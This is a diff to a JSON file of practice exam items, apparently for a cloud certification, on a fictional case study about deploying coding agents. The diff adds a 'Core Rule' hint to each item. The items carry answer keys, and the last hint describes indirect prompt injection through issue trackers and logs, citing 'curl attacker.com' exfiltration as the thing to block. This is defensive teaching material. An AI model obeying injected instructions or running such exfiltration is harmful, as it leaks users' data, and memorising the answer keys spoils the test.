@@ -26,7 +26,8 @@
     "refs": [
       "https://cloud.google.com/generative-ai-app-builder/docs/create-data-store-es",
       "https://cloud.google.com/agent-builder/docs"
-    ]
+    ],
+    "hint": "Core Rule (Connecting Enterprise Repositories to Gemini Enterprise & Agent Search): Gemini Enterprise and Agent Search support private enterprise connectors for source code repositories and documentation platforms within a VPC Service Controls (VPC-SC) perimeter."
   },
   {
     "id": "cs-dev-002",
@@ -55,7 +56,8 @@
     "refs": [
       "https://cloud.google.com/dialogflow/cx/docs/concept/page",
       "https://cloud.google.com/dialogflow/cx/docs/concept/webhook"
-    ]
+    ],
+    "hint": "Core Rule (CX Agent Studio State-Based Workflows for Developer Support): CX Agent Studio's state-based architecture (Pages, Form Parameters, Webhook Event Handlers, and Conditional Transition Routes) enforces deterministic troubleshooting logic."
   },
   {
     "id": "cs-dev-003",
@@ -84,7 +86,8 @@
     "refs": [
       "https://cloud.google.com/vertex-ai/generative-ai/docs/learn/prompts/system-instructions",
       "https://cloud.google.com/agent-builder/docs/agent-designer"
-    ]
+    ],
+    "hint": "Core Rule (System Instructions & Prompt Templates in Gemini Enterprise): In Gemini Enterprise Agent Designer, explicit negative constraints combined with approved library allowlists and few-shot chain-of-thought examples in the system instructions anchor the agent's architectural recommendations."
   },
   {
     "id": "cs-dev-004",
@@ -113,7 +116,8 @@
     "refs": [
       "https://cloud.google.com/workstations/docs/overview",
       "https://cloud.google.com/vpc-service-controls/docs/overview"
-    ]
+    ],
+    "hint": "Core Rule (Deploying Antigravity & Claude Code in Isolated Sandboxes): Deploying Antigravity and Claude Code inside Cloud Workstations and ephemeral GKE sandboxes enclosed within a VPC Service Controls (VPC-SC) perimeter with zero public internet egress eliminates exfiltration vectors."
   },
   {
     "id": "cs-dev-005",
@@ -142,7 +146,8 @@
     "refs": [
       "https://cloud.google.com/vertex-ai/generative-ai/docs/agent-engine/mcp",
       "https://google.github.io/adk-docs/tools/mcp-tools/"
-    ]
+    ],
+    "hint": "Core Rule (Custom MCP Servers for Internal Tooling Integration): Model Context Protocol (MCP) servers provide a standardized, secure abstraction layer between coding agents and enterprise systems."
   },
   {
     "id": "cs-dev-006",
@@ -171,7 +176,8 @@
     "refs": [
       "https://cloud.google.com/vertex-ai/generative-ai/docs/agent-builder",
       "https://cloud.google.com/workstations/docs/overview"
-    ]
+    ],
+    "hint": "Core Rule (Standardizing Workflows via Antigravity Skill Registry): Antigravity's Skill Registry enables platform engineering teams to centrally publish, version, and distribute organization-wide Skills (e.g., standardized table-driven Go test generation), Plugins, Extension Hooks, and workspace Rules."
   },
   {
     "id": "cs-dev-007",
@@ -185,7 +191,7 @@
     "options": [
       "Assign a single junior intern to manually review all 800 microservices every afternoon.",
       "Instruct the primary coding agent to skip security checks whenever code compiles without syntax errors.",
-      "Configure specialized Antigravity Subagents\u2014specifically a Security Auditor Subagent (equipped with SAST/vulnerability scanning tools) and a Performance Profiler Subagent (equipped with SQL `EXPLAIN` and GKE resource profiling tools)\u2014that are automatically invoked by the primary coding agent prior to PR submission.",
+      "Configure specialized Antigravity Subagents—specifically a Security Auditor Subagent (equipped with SAST/vulnerability scanning tools) and a Performance Profiler Subagent (equipped with SQL `EXPLAIN` and GKE resource profiling tools)—that are automatically invoked by the primary coding agent prior to PR submission.",
       "Turn off SQL query logging so performance bottlenecks remain hidden."
     ],
     "answer": [
@@ -200,7 +206,8 @@
     "refs": [
       "https://cloud.google.com/vertex-ai/generative-ai/docs/agent-engine/overview",
       "https://google.github.io/adk-docs/agents/"
-    ]
+    ],
+    "hint": "Core Rule (Specialized Subagents in Antigravity (Security & Performance)): Decomposing complex code review into specialized Antigravity Subagents (Security Auditor Subagent and Performance Profiler Subagent) with focused system instructions and domain-specific toolsets (SAST scanners, SQL query plan analyzers) prevents attention dilution."
   },
   {
     "id": "cs-dev-008",
@@ -229,7 +236,8 @@
     "refs": [
       "https://cloud.google.com/vertex-ai/generative-ai/docs/agent-engine/overview",
       "https://cloud.google.com/build/docs/overview"
-    ]
+    ],
+    "hint": "Core Rule (Agents CLI for Scaling, Governing & Optimizing Deployed Agents): The Agents CLI in Agent Platform is purpose-built for enterprise lifecycle automation of deployed agents."
   },
   {
     "id": "cs-dev-009",
@@ -258,7 +266,8 @@
     "refs": [
       "https://cloud.google.com/vertex-ai/generative-ai/docs/agent-builder",
       "https://cloud.google.com/iam/docs/conditions-overview"
-    ]
+    ],
+    "hint": "Core Rule (Human Mode vs Agent Mode Execution Boundaries): Combining Antigravity's native human-vs-agent execution mode policy tags (`agent mode` for safe sandboxed test execution vs `human mode` interactive sign-off for privileged operations) with cryptographic Git branch protection rules and IAM enforcement guarantees defense-in-depth."
   },
   {
     "id": "cs-dev-010",
@@ -289,7 +298,8 @@
     "refs": [
       "https://cloud.google.com/vertex-ai/generative-ai/docs/agent-engine/overview",
       "https://cloud.google.com/kubernetes-engine/docs/concepts/sandbox-pods"
-    ]
+    ],
+    "hint": "Core Rule (Autonomous Legacy Codebase Refactoring (Java to Go)): Successful large-scale language migration (Java to Go) requires structural AST decomposition to respect dependency graphs and interface contracts, paired with an iterative execution feedback loop inside an isolated GKE sandbox."
   },
   {
     "id": "cs-dev-011",
@@ -318,7 +328,8 @@
     "refs": [
       "https://cloud.google.com/software-delivery-shield/docs/overview",
       "https://cloud.google.com/artifact-registry/docs/analysis"
-    ]
+    ],
+    "hint": "Core Rule (Automated Zero-Day CVE Remediation Workflows): An event-driven remediation architecture connects Google Cloud's Artifact Analysis vulnerability notifications (via Pub/Sub) directly to autonomous Antigravity coding agents running in ephemeral GKE sandboxes."
   },
   {
     "id": "cs-dev-012",
@@ -331,7 +342,7 @@
     "question": "For this question, refer to the DevVelocity Cloud case study. Serving 4,500 software engineers generates millions of daily requests spanning two distinct patterns: (1) real-time IDE inline code completions and docstring generation requiring sub-200ms latency, and (2) deep architectural reasoning for multi-file Java-to-Go microservice refactoring and complex security auditing. Using a single frontier reasoning model for all requests causes excessive latency for inline completions and overruns cloud budgets. What model architecture should you implement?",
     "options": [
       "Limit developers to 2 AI requests per month to save costs.",
-      "Route all requests\u2014including single-line autocomplete\u2014to the largest frontier model with a 60-second thinking budget.",
+      "Route all requests—including single-line autocomplete—to the largest frontier model with a 60-second thinking budget.",
       "Deploy a 1990s rule-based spellchecker for both inline completion and Java-to-Go refactoring.",
       "Configure a dynamic model routing layer in Agent Platform / Antigravity that routes sub-200ms inline completions and boilerplate generation to a fast, cost-optimized code SLM or Gemini Flash, while routing complex multi-file refactoring and security auditing tasks to Gemini Pro or Claude 3.5 Sonnet on Vertex AI."
     ],
@@ -347,7 +358,8 @@
     "refs": [
       "https://cloud.google.com/vertex-ai/generative-ai/docs/learn/models",
       "https://cloud.google.com/vertex-ai/generative-ai/docs/model-garden/explore-models"
-    ]
+    ],
+    "hint": "Core Rule (Model Selection Strategy for Coding Agents (LLM vs SLM)): Dynamic model routing matches workload complexity and latency SLAs to the optimal model tier: high-frequency, low-latency tasks like inline autocomplete and docstring generation require a fast, low-cost code Small Language Model (SLM) or Gemini Flash (<200ms latency), while complex multi-file architectural refactoring and vulnerability analysis leverage frontier reasoning models (Gemini Pro / Claude on Vertex AI)."
   },
   {
     "id": "cs-dev-013",
@@ -376,7 +388,8 @@
     "refs": [
       "https://cloud.google.com/vertex-ai/generative-ai/docs/rag-engine/chunking",
       "https://cloud.google.com/vertex-ai/docs/vector-search/overview"
-    ]
+    ],
+    "hint": "Core Rule (Syntax-Aware Code RAG with Vector Search & Agent Retrieval): Source code possesses strict formal grammar that is destroyed by naive character-count chunking."
   },
   {
     "id": "cs-dev-014",
@@ -405,7 +418,8 @@
     "refs": [
       "https://google.github.io/adk-docs/agents/workflow-agents/",
       "https://google.github.io/adk-docs/a2a/"
-    ]
+    ],
+    "hint": "Core Rule (Multi-Agent Code Migration with Agent2Agent (A2A) & ADK): Complex software engineering workflows benefit from hierarchical orchestration in ADK combined with standardized Agent2Agent (A2A) communication."
   },
   {
     "id": "cs-dev-015",
@@ -434,7 +448,8 @@
     "refs": [
       "https://google.github.io/adk-docs/sessions/memory/",
       "https://cloud.google.com/vertex-ai/generative-ai/docs/agent-engine/sessions"
-    ]
+    ],
+    "hint": "Core Rule (Agent Platform Memory Bank for Engineering Knowledge Persistence): Agent Platform Memory Bank allows ADK agents to consolidate transient conversational troubleshooting sessions into persistent, searchable semantic memories."
   },
   {
     "id": "cs-dev-016",
@@ -463,7 +478,8 @@
     "refs": [
       "https://cloud.google.com/sql/docs/postgres/users",
       "https://google.github.io/adk-docs/tools/mcp-tools/"
-    ]
+    ],
+    "hint": "Core Rule (Safe Cloud SQL Query Optimization via Read-Only MCP Tools): Connecting the Cloud SQL MCP Server to a synthetic staging snapshot protects customer privacy while providing accurate table cardinality for PostgreSQL query planner statistics."
   },
   {
     "id": "cs-dev-017",
@@ -492,7 +508,8 @@
     "refs": [
       "https://cloud.google.com/vertex-ai/generative-ai/docs/agent-engine/overview",
       "https://google.github.io/adk-docs/"
-    ]
+    ],
+    "hint": "Core Rule (Agent Registry for Managing Enterprise Subagents & MCP Servers): Google Cloud Agent Registry provides a centralized enterprise catalog to register, discover, version, and govern autonomous agents, subagents, and Model Context Protocol (MCP) servers."
   },
   {
     "id": "cs-dev-018",
@@ -521,7 +538,8 @@
     "refs": [
       "https://google.github.io/adk-docs/evaluate/",
       "https://cloud.google.com/vertex-ai/generative-ai/docs/models/evaluation-overview"
-    ]
+    ],
+    "hint": "Core Rule (Evaluating Coding Agents with ADK Evalset & Golden Repositories): Evaluating autonomous software engineering agents requires deterministic execution benchmarks rather than purely subjective text ratings."
   },
   {
     "id": "cs-dev-019",
@@ -550,7 +568,8 @@
     "refs": [
       "https://cloud.google.com/vertex-ai/generative-ai/docs/agent-engine/overview",
       "https://cloud.google.com/billing/docs/how-to/export-data-bigquery"
-    ]
+    ],
+    "hint": "Core Rule (Centralized Usage Telemetry & Cost Attribution via Agent Gateway): Agent Gateway acts as the central control and observability plane for all agentic API traffic."
   },
   {
     "id": "cs-dev-020",
@@ -570,7 +589,7 @@
     "answer": [
       3
     ],
-    "explanation": "Cyclic edit-compile-fail loops are a classic failure mode in autonomous coding agents. Inspecting trajectory traces in Cloud Trace reveals the repetitive tool call pattern, while implementing deterministic state-hash loop detection (checking if `hash(code_diff + compiler_stderr)` has been seen in the current session) stops wasted token burn after 3 identical failures\u2014forcing the agent to either invoke a higher-reasoning model tier, query documentation via MCP, or escalate to the developer.",
+    "explanation": "Cyclic edit-compile-fail loops are a classic failure mode in autonomous coding agents. Inspecting trajectory traces in Cloud Trace reveals the repetitive tool call pattern, while implementing deterministic state-hash loop detection (checking if `hash(code_diff + compiler_stderr)` has been seen in the current session) stops wasted token burn after 3 identical failures—forcing the agent to either invoke a higher-reasoning model tier, query documentation via MCP, or escalate to the developer.",
     "whyWrong": {
       "0": "Randomly deleting repository files destroys production software.",
       "1": "Removing the compiler allows broken, uncompilable code to be submitted as pull requests.",
@@ -579,7 +598,8 @@
     "refs": [
       "https://cloud.google.com/trace/docs/overview",
       "https://google.github.io/adk-docs/agents/workflow-agents/loop-agents/"
-    ]
+    ],
+    "hint": "Core Rule (Troubleshooting Cyclic Edit-Compile-Fail Reasoning Loops): Cyclic edit-compile-fail loops are a classic failure mode in autonomous coding agents."
   },
   {
     "id": "cs-dev-021",
@@ -608,7 +628,8 @@
     "refs": [
       "https://cloud.google.com/vertex-ai/generative-ai/docs/agent-engine/deploy",
       "https://cloud.google.com/kubernetes-engine/docs/concepts/autopilot-overview"
-    ]
+    ],
+    "hint": "Core Rule (Scaling Autonomous Refactoring Workloads on Agent Runtime & GKE): Decoupling agent orchestration (deployed on managed Agent Runtime or Cloud Run with rapid autoscaling and scale-to-zero) from heavy container compilation sandboxes (scheduled dynamically via Pub/Sub onto GKE Autopilot pods) provides optimal elasticity."
   },
   {
     "id": "cs-dev-022",
@@ -637,7 +658,8 @@
     "refs": [
       "https://cloud.google.com/vertex-ai/generative-ai/docs/model-armor/overview",
       "https://cloud.google.com/sensitive-data-protection/docs/infotypes-reference"
-    ]
+    ],
+    "hint": "Core Rule (Model Armor & Secret Protection on Agent Gateway): Enforcing Model Armor and Sensitive Data Protection (Cloud DLP) secret-inspection templates at the Agent Gateway ingress layer provides deterministic, real-time protection against accidental credential exposure."
   },
   {
     "id": "cs-dev-023",
@@ -666,7 +688,8 @@
     "refs": [
       "https://cloud.google.com/vertex-ai/generative-ai/docs/agent-engine/security",
       "https://cloud.google.com/iam/docs/workload-identity-federation"
-    ]
+    ],
+    "hint": "Core Rule (OAuth 2.0 Auth Manager & Least-Privilege Tool Execution): OAuth 2.0 Auth Manager prevents confused-deputy vulnerabilities in multi-tenant MCP servers."
   },
   {
     "id": "cs-dev-024",
@@ -695,7 +718,8 @@
     "refs": [
       "https://cloud.google.com/iam/docs/principal-access-boundary-policies",
       "https://cloud.google.com/vertex-ai/generative-ai/docs/agent-engine/security"
-    ]
+    ],
+    "hint": "Core Rule (Principal Access Boundary (PAB) Policies with Agent Identity): Principal Access Boundary (PAB) policies define the maximum perimeter of resources a principal (such as an Agent Identity) is permitted to access across Google Cloud."
   },
   {
     "id": "cs-dev-025",
@@ -726,6 +750,7 @@
     "refs": [
       "https://cloud.google.com/vertex-ai/generative-ai/docs/model-armor/overview",
       "https://cloud.google.com/kubernetes-engine/docs/how-to/network-policy"
-    ]
+    ],
+    "hint": "Core Rule (Defending Against Indirect Prompt Injection in Issue Trackers & Logs): Defending autonomous coding agents against indirect prompt injection requires multi-layered guardrails: (1) scanning untrusted MCP tool outputs (external issue descriptions, logs) using Model Armor prompt-injection detectors before they enter the LLM context, and (2) enforcing zero-trust network egress isolation on GKE sandboxes via VPC-SC and egress firewalls so that even if adversarial instructions bypass model filters, outbound exfiltration (`curl attacker.com`) is blocked at the network layer."
   }
 ]
